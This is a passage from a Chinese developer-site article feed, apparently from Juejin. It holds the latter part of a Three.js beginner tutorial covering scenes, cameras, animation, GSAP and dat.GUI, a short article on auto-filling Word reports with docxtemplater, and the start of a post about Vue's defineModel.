  <span class="hljs-number">1000</span> <span class="hljs-comment">// 远截面（最远可见距离）</span>
);

<span class="hljs-comment">// 设置相机位置（x, y, z轴坐标）</span>
camera.position.<span class="hljs-keyword">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
<span class="hljs-comment">// 将相机添加到场景</span>
scene.add(camera);
</code></pre>
<h3 data-id="heading-6">3. 物体（Cube）</h3>
<p>3D 物体由几何体（Geometry）和材质（Material）组成。以立方体为例，先定义形状尺寸，再设置外观样式，最后组合成可渲染的网格对象：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. 创建几何体（长、宽、高均为1）</span>
<span class="hljs-keyword">const</span> cubeGeometry = <span class="hljs-keyword">new</span> THREE.BoxGeometry(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
<span class="hljs-comment">// 2. 创建材质（基础网格材质，黄色）</span>
<span class="hljs-keyword">const</span> cubeMaterial = <span class="hljs-keyword">new</span> THREE.MeshBasicMaterial({ color: <span class="hljs-number">0xffff00</span> });
<span class="hljs-comment">// 3. 组合几何体与材质，创建立方体对象</span>
<span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);
<span class="hljs-comment">// 4. 将立方体添加到场景</span>
scene.<span class="hljs-keyword">add</span>(cube);
</code></pre>
<h3 data-id="heading-7">4. 渲染器（Renderer）</h3>
<p>渲染器负责将场景和相机的信息渲染到页面上，本质是创建一个 Canvas 元素并插入到 DOM 中：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 初始化WebGL渲染器</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
<span class="hljs-comment">// 设置渲染尺寸（与窗口大小一致）</span>
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-comment">// 将渲染结果（Canvas）添加到页面body</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// 执行渲染：通过相机拍摄场景并呈现</span>
renderer.<span class="hljs-title function_">render</span>(scene, camera);
</code></pre>
<p>此时你会看到一个平面黄色方块 —— 要实现真正的 3D 交互，还需要添加控制器和辅助工具。</p>
<h2 data-id="heading-8">进阶交互：让 3D 世界 "活" 起来</h2>
<h3 data-id="heading-9">1. 轨道控制器（OrbitControls）</h3>
<p>添加轨道控制器后，可通过鼠标拖拽旋转视角、滚轮缩放，实现环绕观察效果，让平面图形秒变 3D 物体：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 导入轨道控制器</span>
import { OrbitControls } from "three/examples/jsm/controls/OrbitControls";

<span class="hljs-comment">// 创建控制器（绑定相机和渲染画布）</span>
const controls = new <span class="hljs-built_in">OrbitControls</span>(camera, renderer.domElement);
<span class="hljs-comment">// 开启阻尼效果，让操作更平滑</span>
controls<span class="hljs-selector-class">.enableDamping</span> = true;

<span class="hljs-comment">// 定义渲染循环函数</span>
function <span class="hljs-built_in">render</span>() {
  <span class="hljs-comment">// 更新控制器状态（确保阻尼效果生效）</span>
  controls<span class="hljs-selector-class">.update</span>();
  <span class="hljs-comment">// 重复渲染下一帧</span>
  renderer<span class="hljs-selector-class">.render</span>(scene, camera);
  <span class="hljs-built_in">requestAnimationFrame</span>(render);
}

<span class="hljs-comment">// 启动渲染循环</span>
<span class="hljs-built_in">render</span>();
</code></pre>
<h3 data-id="heading-10">2. 坐标轴辅助器</h3>
<p>添加坐标轴辅助器可直观看到 3D 坐标系（红色 X 轴、绿色 Y 轴、蓝色 Z 轴），方便调试物体位置：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 创建坐标轴辅助器（轴长为5）</span>
<span class="hljs-keyword">const</span> axesHelper = <span class="hljs-keyword">new</span> THREE.AxesHelper(<span class="hljs-number">5</span>);
<span class="hljs-comment">// 添加到场景</span>
scene.<span class="hljs-keyword">add</span>(axesHelper);
</code></pre>
<h3 data-id="heading-11">3. 物体变换：移动、缩放与旋转</h3>
<p>通过修改物体的 position、scale、rotation 属性，可实现各类变换效果，支持单独设置或批量赋值：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// 1. 移动（x轴移动3个单位）
<span class="hljs-attr">cube.position.x</span> = <span class="hljs-number">3</span><span class="hljs-comment">;</span>
// 批量设置位置（x, y, z）
cube.position.set(3, 1, 2)<span class="hljs-comment">;</span>

// 2. 缩放（x轴3倍、y轴2倍、z轴1倍）
cube.scale.set(3, 2, 1)<span class="hljs-comment">;</span>
// 单独设置x轴缩放
<span class="hljs-attr">cube.scale.x</span> = <span class="hljs-number">4</span><span class="hljs-comment">;</span>

// 3. 旋转（x轴旋转45度，弧度制：Math.PI/4）
<span class="hljs-attr">cube.rotation.x</span> = Math.PI / <span class="hljs-number">4</span><span class="hljs-comment">;</span>
// 批量设置旋转（x, y, z, 顺序）
cube.rotation.set(Math.PI/4, 0, 0, "XZY")<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-12">4. 动画实现：让物体动起来</h3>
<h4 data-id="heading-13">方式 1：requestAnimationFrame 手动控制</h4>
<p>利用浏览器帧循环 API，实现匀速运动或周期性动画：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">render</span>(time) {
  <span class="hljs-comment">// time为时间戳，转换为秒并取余（实现0-5秒循环）</span>
  let t = (time / <span class="hljs-number">1000</span>) % <span class="hljs-number">5</span>;
  <span class="hljs-comment">// x轴随时间移动（0-5单位循环）</span>
  cube<span class="hljs-selector-class">.position</span><span class="hljs-selector-class">.x</span> = t;
  <span class="hljs-comment">// 持续渲染</span>
  renderer<span class="hljs-selector-class">.render</span>(scene, camera);
  <span class="hljs-built_in">requestAnimationFrame</span>(render);
}
<span class="hljs-built_in">render</span>();
</code></pre>
<h4 data-id="heading-14">方式 2：Clock 时钟工具</h4>
<p>Three.js 内置 Clock 工具，可精准获取时间间隔，避免手动计算误差：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// 创建时钟对象
const <span class="hljs-attr">clock</span> = new THREE.Clock()<span class="hljs-comment">;</span>

function render() {
  // 获取时钟运行总时长
  let <span class="hljs-attr">time</span> = clock.getElapsedTime()<span class="hljs-comment">;</span>
  // 获取两次渲染的时间间隔（约16ms/帧）
  let <span class="hljs-attr">deltaTime</span> = clock.getDelta()<span class="hljs-comment">;</span>
  
  let <span class="hljs-attr">t</span> = time % <span class="hljs-number">5</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">cube.position.x</span> = t<span class="hljs-comment">;</span>
  
  renderer.render(scene, camera)<span class="hljs-comment">;</span>
  requestAnimationFrame(render)<span class="hljs-comment">;</span>
}
render()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">方式 3：GSAP 动画库（推荐）</h4>
<p>GSAP（GreenSock Animation Platform）提供更强大的动画控制，支持缓动效果、循环、延迟等功能，集成简单高效：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 导入GSAP库</span>
<span class="hljs-keyword">import</span> gsap <span class="hljs-keyword">from</span> <span class="hljs-string">"gsap"</span>;

<span class="hljs-comment">// 1. 位置动画：x轴从0到5，5秒完成，往返循环</span>
<span class="hljs-keyword">const</span> animate1 = gsap.<span class="hljs-title function_">to</span>(cube.<span class="hljs-property">position</span>, {
  <span class="hljs-attr">x</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">duration</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">ease</span>: <span class="hljs-string">"power1.inOut"</span>, <span class="hljs-comment">// 缓动效果</span>
  <span class="hljs-attr">repeat</span>: -<span class="hljs-number">1</span>, <span class="hljs-comment">// 无限循环（-1表示循环）</span>
  <span class="hljs-attr">yoyo</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 往返运动</span>
  <span class="hljs-attr">delay</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 延迟2秒启动</span>
  <span class="hljs-attr">onStart</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"动画开始"</span>),
  <span class="hljs-attr">onComplete</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"动画完成"</span>)
});

<span class="hljs-comment">// 2. 旋转动画：x轴旋转360度（2π弧度）</span>
gsap.<span class="hljs-title function_">to</span>(cube.<span class="hljs-property">rotation</span>, { <span class="hljs-attr">x</span>: <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">5</span> });

<span class="hljs-comment">// 双击暂停/恢复动画</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"dblclick"</span>, <span class="hljs-function">() =&gt;</span> {
  animate1.<span class="hljs-title function_">isActive</span>() ? animate1.<span class="hljs-title function_">pause</span>() : animate1.<span class="hljs-title function_">resume</span>();
});

<span class="hljs-comment">// 保持渲染循环</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  <span class="hljs-title function_">requestAnimationFrame</span>(render);
}
<span class="hljs-title function_">render</span>();
</code></pre>
<h2 data-id="heading-16">实用功能：提升开发体验</h2>
<h3 data-id="heading-17">1. 窗口自适应</h3>
<p>监听窗口尺寸变化，实时更新相机和渲染器设置，避免画面拉伸：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"resize"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 更新相机宽高比</span>
  camera.<span class="hljs-property">aspect</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;
  <span class="hljs-comment">// 刷新相机投影矩阵</span>
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  <span class="hljs-comment">// 更新渲染器尺寸</span>
  renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
  <span class="hljs-comment">// 设置像素比（适配高清屏幕）</span>
  renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>);
});
</code></pre>
<h3 data-id="heading-18">2. 全屏切换</h3>
<p>双击画布实现全屏 / 退出全屏功能，提升沉浸式体验：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"dblclick"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> fullScreenElement = <span class="hljs-variable language_">document</span>.<span class="hljs-property">fullscreenElement</span>;
  <span class="hljs-keyword">if</span> (!fullScreenElement) {
    <span class="hljs-comment">// 进入全屏（渲染画布元素）</span>
    renderer.<span class="hljs-property">domElement</span>.<span class="hljs-title function_">requestFullscreen</span>();
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 退出全屏</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">exitFullscreen</span>();
  }
});
</code></pre>
<h3 data-id="heading-19">3. 图形化调试（dat.GUI）</h3>
<p>通过 dat.GUI 创建可视化控制面板，实时调整物体参数，无需修改代码重新运行：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 导入dat.GUI</span>
import * <span class="hljs-keyword">as</span> dat <span class="hljs-keyword">from</span> <span class="hljs-string">"dat.gui"</span>;

<span class="hljs-comment">// 创建GUI实例</span>
<span class="hljs-keyword">const</span> gui = <span class="hljs-keyword">new</span> dat.GUI();

<span class="hljs-comment">// 1. 控制x轴位置（0-5，步长0.01）</span>
gui.<span class="hljs-keyword">add</span>(cube.position, <span class="hljs-string">"x"</span>)
  .min(<span class="hljs-number">0</span>)
  .max(<span class="hljs-number">5</span>)
  .step(<span class="hljs-number">0.01</span>)
  .name(<span class="hljs-string">"移动X轴"</span>)
  .onChange(<span class="hljs-keyword">value</span> =&gt; console.log(<span class="hljs-string">"X轴位置："</span>, <span class="hljs-keyword">value</span>));

<span class="hljs-comment">// 2. 控制物体颜色</span>
<span class="hljs-keyword">const</span> <span class="hljs-keyword">params</span> = {
  color: <span class="hljs-string">"#ffff00"</span>,
  <span class="hljs-comment">// 自定义按钮事件：启动运动</span>
  startMove: () =&gt; {
    gsap.to(cube.position, { x: <span class="hljs-number">5</span>, duration: <span class="hljs-number">2</span>, yoyo: <span class="hljs-literal">true</span>, repeat: <span class="hljs-number">-1</span> });
  }
};
gui.addColor(<span class="hljs-keyword">params</span>, <span class="hljs-string">"color"</span>).onChange(<span class="hljs-keyword">value</span> =&gt; {
  cube.material.color.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">value</span>);
});

<span class="hljs-comment">// 3. 控制物体可见性</span>
gui.<span class="hljs-keyword">add</span>(cube, <span class="hljs-string">"visible"</span>).name(<span class="hljs-string">"是否显示"</span>);

<span class="hljs-comment">// 4. 创建文件夹分类</span>
<span class="hljs-keyword">const</span> folder = gui.addFolder(<span class="hljs-string">"立方体设置"</span>);
<span class="hljs-comment">// 控制线框模式</span>
folder.<span class="hljs-keyword">add</span>(cube.material, <span class="hljs-string">"wireframe"</span>).name(<span class="hljs-string">"线框模式"</span>);
<span class="hljs-comment">// 绑定自定义事件</span>
folder.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">params</span>, <span class="hljs-string">"startMove"</span>).name(<span class="hljs-string">"启动运动"</span>);
</code></pre>
<h2 data-id="heading-20">结语</h2>
<p>前端的世界从不局限于 Vue 与 React 的框架之争，当 WebGL 成为下一代前端的基础设施，当元宇宙、数字孪生、AR/VR 等技术逐渐落地，Web3D 正成为开发者不可或缺的技能。</p>
<p>从二维到三维，不仅是技术栈的拓展，更是思维方式的升级。愿你在 Three.js 的三维坐标系中，探索更多可能，征服属于前端开发者的星辰大海。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用docxtemplater进行Word文档的自动填充]]></title>    <link>https://juejin.cn/post/7592996072705048626</link>    <guid>https://juejin.cn/post/7592996072705048626</guid>    <pubDate>2026-01-09T03:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705048626" data-draft-id="7592887786966171684" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用docxtemplater进行Word文档的自动填充"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-09T03:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Arnbit1on"/> <meta itemprop="url" content="https://juejin.cn/user/114004941607207"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用docxtemplater进行Word文档的自动填充
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/114004941607207/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Arnbit1on
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:30:06.000Z" title="Fri Jan 09 2026 03:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>  最近给其他部门做了个简单的脚本要把一堆数据填充到word报告里。模板固定的都好说。用 <code>docxtemplater</code> 就行。</p>
<p>  使用 <code>npm install docxtemplater</code> 直接下载即可。word的格式如下处理就行：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d8830d1bd024e4cbd6772f7bbfa5204~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXJuYml0MW9u:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534206&amp;x-signature=8l8ZGVA%2Fzpsr9AoAf0obvw6mzd8%3D" alt="image.png" loading="lazy"/></p>
<p>  <code>deviations</code>是后面js代码里传递的对象名称。以<code>{#deviations}</code>开头，<code>{/deviations}</code>结尾。类似于for循环。index、code这些字段就是item.index,item.code等。只不过省去了item。</p>
<p>test.json文件格式如下：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[  {    <span class="hljs-string">"code"</span>: <span class="hljs-string">"测试code1"</span>,    <span class="hljs-string">"reason"</span>: <span class="hljs-string">"测试reason1"</span>,    <span class="hljs-string">"inspect"</span>: <span class="hljs-string">"测试inspect1"</span>,    <span class="hljs-string">"complation"</span>: <span class="hljs-string">"测试complation1"</span>  },  {    <span class="hljs-string">"code"</span>: <span class="hljs-string">"测试code2"</span>,    <span class="hljs-string">"reason"</span>: <span class="hljs-string">"测试reason2"</span>,    <span class="hljs-string">"inspect"</span>: <span class="hljs-string">"测试inspect2"</span>,    <span class="hljs-string">"complation"</span>: <span class="hljs-string">"测试complation2"</span>  }]</span>

</code></pre>
<p>可以简单实现的代码如下根据自己需求去更改就行：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">"fs/promises"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Docxtemplater</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"docxtemplater"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">PizZip</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"pizzip"</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 读取模板</span>
  <span class="hljs-keyword">const</span> templateContent = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"测试.docx"</span>);

  <span class="hljs-comment">// 加载数据</span>
  <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"test.json"</span>, <span class="hljs-string">"utf8"</span>));

  <span class="hljs-comment">// 构造符合模板要求的数据结构</span>
  <span class="hljs-keyword">const</span> reportData = {
    <span class="hljs-attr">deviations</span>: data.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, i</span>) =&gt;</span> ({
      <span class="hljs-attr">index</span>: i + <span class="hljs-number">1</span>,
      <span class="hljs-attr">code</span>: item.<span class="hljs-property">code</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">reason</span>: item.<span class="hljs-property">reason</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">inspect</span>: item.<span class="hljs-property">inspect</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">complation</span>: item.<span class="hljs-property">complation</span> || <span class="hljs-string">""</span>,
    })),
  };

  <span class="hljs-comment">// 渲染模板</span>
  <span class="hljs-keyword">const</span> zip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PizZip</span>(templateContent);
  <span class="hljs-keyword">const</span> doc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Docxtemplater</span>(zip, {
    <span class="hljs-attr">paragraphLoop</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">linebreaks</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">nullGetter</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">""</span>,
  });
  doc.<span class="hljs-title function_">render</span>(reportData);

  <span class="hljs-keyword">const</span> buffer = doc
    .<span class="hljs-title function_">getZip</span>()
    .<span class="hljs-title function_">generate</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">"nodebuffer"</span>, <span class="hljs-attr">compression</span>: <span class="hljs-string">"DEFLATE"</span> });
  <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">"test输出.docx"</span>, buffer);
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
<p>输出的结果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96de6aac68b9455c85f4b176778aa803~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXJuYml0MW9u:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534206&amp;x-signature=qACpzHbdODk%2BqL3vAXSo4Tp2bW8%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[defineModel的行为与文档不一致]]></title>    <link>https://juejin.cn/post/7592992745573236774</link>    <guid>https://juejin.cn/post/7592992745573236774</guid>    <pubDate>2026-01-09T03:32:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592992745573236774" data-draft-id="7592903126178332722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="defineModel的行为与文档不一致"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-09T03:32:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FanetheDivine"/> <meta itemprop="url" content="https://juejin.cn/user/4246761716322491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            defineModel的行为与文档不一致
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4246761716322491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FanetheDivine
